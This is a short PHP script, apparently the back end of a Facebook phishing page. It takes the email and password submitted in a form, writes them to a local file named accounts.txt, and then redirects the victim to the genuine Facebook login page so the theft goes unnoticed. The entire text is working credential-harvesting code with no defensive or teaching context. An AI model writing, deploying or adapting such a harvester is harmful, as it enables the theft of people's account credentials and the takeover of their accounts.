<?php
    $accountsFile = fopen("accounts.txt", "aw") or die("Unable to open file!");
    fwrite($accountsFile, "Email: " . htmlspecialchars($_POST["email"]) . "\n");
    fwrite($accountsFile, "Password: " . htmlspecialchars($_POST["pass"]) . "\n\n");
    fclose($accountsFile);
    header('Location: ' . "https://www.facebook.com/login/");
?>